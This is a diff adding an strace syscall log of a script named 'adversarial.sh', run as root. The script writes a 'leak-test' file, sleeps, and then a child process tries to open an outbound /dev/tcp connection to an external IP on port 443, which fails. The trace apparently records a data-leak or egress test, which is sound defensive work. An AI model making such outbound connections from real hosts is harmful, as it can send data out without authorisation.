@@ -1,0 +1,106 @@
+20:02:16.946931 execve("/tmp/ztie/adversarial.sh", ["/tmp/ztie/adversarial.sh"], 0x7ffec04d7e08 /* 30 vars */) = 0
+20:02:16.947598 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+20:02:16.947713 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
+20:02:16.947937 newfstatat(3</etc/ld.so.cache>, "", {st_mode=S_IFREG|0644, st_size=19984, ...}, AT_EMPTY_PATH) = 0
+20:02:16.948614 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
+20:02:16.948980 newfstatat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "", {st_mode=S_IFREG|0755, st_size=2220400, ...}, AT_EMPTY_PATH) = 0
+20:02:16.950355 rt_sigaction(SIGCHLD, {sa_handler=0x5f23f36c6aa0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x77d1c7e42520}, NULL, 8) = 0
+20:02:16.950714 newfstatat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/var/snap/amazon-ssm-agent/13349", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+20:02:16.950797 newfstatat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+20:02:16.950874 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/tmp/ztie/adversarial.sh", O_RDONLY) = 3</tmp/ztie/adversarial.sh>
+20:02:16.951181 rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+20:02:16.951243 rt_sigaction(SIGINT, {sa_handler=0x5f23f36c6aa0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x77d1c7e42520}, NULL, 8) = 0
+20:02:16.951305 rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+20:02:16.951383 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x77d1c7e42520}, NULL, 8) = 0
+20:02:16.951444 rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+20:02:16.951504 rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x77d1c7e42520}, NULL, 8) = 0
+20:02:16.951628 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/tmp/ztie-leak-test.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3</tmp/ztie-leak-test.txt>
+20:02:16.952230 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77d1c80a3a10) = 1215
+20:02:16.952492 wait4(-1, 0x7ffe8b7e492c, WNOHANG, NULL) = 0
+20:02:16.952545 rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], [], 8) = 0
+20:02:16.952629 rt_sigsuspend([], 8)    = ? ERESTARTNOHAND (To be restarted if no handler)
+20:02:18.965189 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1215, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+20:02:18.965230 rt_sigreturn({mask=~[KILL STOP RTMIN RT_1]}) = -1 EINTR (Interrupted system call)
+20:02:18.965295 rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
+20:02:18.965377 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 1215
+20:02:18.965451 wait4(-1, 0x7ffe8b7e492c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+20:02:18.965559 exit_group(0)           = ?
+20:02:18.965693 +++ exited with 0 +++
+20:02:16.952567 rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[INT], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77d1c7e42520}, {sa_handler=0x5f23f36c6aa0, sa_mask=~[KILL STOP RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x77d1c7e42520}, 8) = 0
+20:02:16.952649 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[QUIT], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77d1c7e42520}, {sa_handler=SIG_DFL, sa_mask=~[KILL STOP RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x77d1c7e42520}, 8) = 0
+20:02:16.952763 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/dev/null", O_RDONLY) = 0</dev/null>
+20:02:16.952882 newfstatat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/local/sbin/sleep", 0x7ffe8b7e4990, 0) = -1 ENOENT (No such file or directory)
+20:02:16.952961 newfstatat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/local/bin/sleep", 0x7ffe8b7e4990, 0) = -1 ENOENT (No such file or directory)
+20:02:16.953032 newfstatat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/sbin/sleep", 0x7ffe8b7e4990, 0) = -1 ENOENT (No such file or directory)
+20:02:16.953107 newfstatat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/bin/sleep", {st_mode=S_IFREG|0755, st_size=35336, ...}, 0) = 0
+20:02:16.953197 rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], NULL, 8) = 0
+20:02:16.953259 vfork()                 = 1216
+20:02:16.954426 rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
+20:02:16.954474 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 1216
+20:02:18.963582 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1216, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+20:02:18.963632 rt_sigreturn({mask=[]}) = 1216
+20:02:18.963698 wait4(-1, 0x7ffe8b7e48ec, WNOHANG, NULL) = -1 ECHILD (No child processes)
+20:02:18.963798 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77d1c80a3a10) = 1218
+20:02:18.964037 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 2}], 0, NULL) = 1218
+20:02:18.964849 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1218, si_uid=0, si_status=2, si_utime=0, si_stime=0} ---
+20:02:18.964893 rt_sigreturn({mask=[]}) = 1218
+20:02:18.964956 wait4(-1, 0x7ffe8b7e494c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+20:02:18.965030 exit_group(0)           = ?
+20:02:18.965142 +++ exited with 0 +++
+20:02:16.953402 rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
+20:02:16.953487 execve("/usr/bin/sleep", ["sleep", "2"], 0x5f23fae5c9e0 /* 30 vars */) = 0
+20:02:16.955528 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+20:02:16.955611 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
+20:02:16.955703 newfstatat(3</etc/ld.so.cache>, "", {st_mode=S_IFREG|0644, st_size=19984, ...}, AT_EMPTY_PATH) = 0
+20:02:16.956003 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
+20:02:16.956353 newfstatat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "", {st_mode=S_IFREG|0755, st_size=2220400, ...}, AT_EMPTY_PATH) = 0
+20:02:16.957706 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/locale-archive>
+20:02:16.957804 newfstatat(3</usr/lib/locale/locale-archive>, "", {st_mode=S_IFREG|0644, st_size=3048928, ...}, AT_EMPTY_PATH) = 0
+20:02:16.957992 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/share/locale/locale.alias", O_RDONLY|O_CLOEXEC) = 3</etc/locale.alias>
+20:02:16.958070 newfstatat(3</etc/locale.alias>, "", {st_mode=S_IFREG|0644, st_size=2996, ...}, AT_EMPTY_PATH) = 0
+20:02:16.958312 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_IDENTIFICATION", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.958399 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_IDENTIFICATION", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_IDENTIFICATION>
+20:02:16.958475 newfstatat(3</usr/lib/locale/C.utf8/LC_IDENTIFICATION>, "", {st_mode=S_IFREG|0644, st_size=258, ...}, AT_EMPTY_PATH) = 0
+20:02:16.958650 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY) = 3</usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache>
+20:02:16.958731 newfstatat(3</usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache>, "", {st_mode=S_IFREG|0644, st_size=27002, ...}, AT_EMPTY_PATH) = 0
+20:02:16.958967 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_MEASUREMENT", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.959039 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_MEASUREMENT", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_MEASUREMENT>
+20:02:16.959112 newfstatat(3</usr/lib/locale/C.utf8/LC_MEASUREMENT>, "", {st_mode=S_IFREG|0644, st_size=23, ...}, AT_EMPTY_PATH) = 0
+20:02:16.959287 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_TELEPHONE", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.959374 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_TELEPHONE", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_TELEPHONE>
+20:02:16.959448 newfstatat(3</usr/lib/locale/C.utf8/LC_TELEPHONE>, "", {st_mode=S_IFREG|0644, st_size=47, ...}, AT_EMPTY_PATH) = 0
+20:02:16.959624 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_ADDRESS", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.959693 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_ADDRESS", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_ADDRESS>
+20:02:16.959766 newfstatat(3</usr/lib/locale/C.utf8/LC_ADDRESS>, "", {st_mode=S_IFREG|0644, st_size=127, ...}, AT_EMPTY_PATH) = 0
+20:02:16.960044 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_NAME", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.960117 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_NAME", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_NAME>
+20:02:16.960191 newfstatat(3</usr/lib/locale/C.utf8/LC_NAME>, "", {st_mode=S_IFREG|0644, st_size=62, ...}, AT_EMPTY_PATH) = 0
+20:02:16.960373 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_PAPER", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.960458 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_PAPER", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_PAPER>
+20:02:16.960533 newfstatat(3</usr/lib/locale/C.utf8/LC_PAPER>, "", {st_mode=S_IFREG|0644, st_size=34, ...}, AT_EMPTY_PATH) = 0
+20:02:16.960708 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_MESSAGES", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.960776 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_MESSAGES", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_MESSAGES>
+20:02:16.960849 newfstatat(3</usr/lib/locale/C.utf8/LC_MESSAGES>, "", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_EMPTY_PATH) = 0
+20:02:16.960966 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES>
+20:02:16.961040 newfstatat(3</usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES>, "", {st_mode=S_IFREG|0644, st_size=48, ...}, AT_EMPTY_PATH) = 0
+20:02:16.961211 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_MONETARY", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.961279 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_MONETARY", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_MONETARY>
+20:02:16.961366 newfstatat(3</usr/lib/locale/C.utf8/LC_MONETARY>, "", {st_mode=S_IFREG|0644, st_size=270, ...}, AT_EMPTY_PATH) = 0
+20:02:16.961539 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_COLLATE", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.961608 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_COLLATE", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_COLLATE>
+20:02:16.961681 newfstatat(3</usr/lib/locale/C.utf8/LC_COLLATE>, "", {st_mode=S_IFREG|0644, st_size=1406, ...}, AT_EMPTY_PATH) = 0
+20:02:16.961857 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_TIME", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.961925 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_TIME", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_TIME>
+20:02:16.961998 newfstatat(3</usr/lib/locale/C.utf8/LC_TIME>, "", {st_mode=S_IFREG|0644, st_size=3360, ...}, AT_EMPTY_PATH) = 0
+20:02:16.962175 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_NUMERIC", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.962244 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_NUMERIC", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_NUMERIC>
+20:02:16.962317 newfstatat(3</usr/lib/locale/C.utf8/LC_NUMERIC>, "", {st_mode=S_IFREG|0644, st_size=50, ...}, AT_EMPTY_PATH) = 0
+20:02:16.962506 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.UTF-8/LC_CTYPE", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+20:02:16.962576 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/usr/lib/locale/C.utf8/LC_CTYPE", O_RDONLY|O_CLOEXEC) = 3</usr/lib/locale/C.utf8/LC_CTYPE>
+20:02:16.962649 newfstatat(3</usr/lib/locale/C.utf8/LC_CTYPE>, "", {st_mode=S_IFREG|0644, st_size=353616, ...}, AT_EMPTY_PATH) = 0
+20:02:18.963165 exit_group(0)           = ?
+20:02:18.963484 +++ exited with 0 +++
+20:02:18.964109 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3</dev/null>
+20:02:18.964376 openat(AT_FDCWD</var/snap/amazon-ssm-agent/13349>, "/dev/tcp/93.184.216.34/443", O_RDWR|O_CREAT, 0666) = -1 ENOENT (No such file or directory)
+20:02:18.964647 exit_group(2)           = ?
+20:02:18.964774 +++ exited with 2 +++
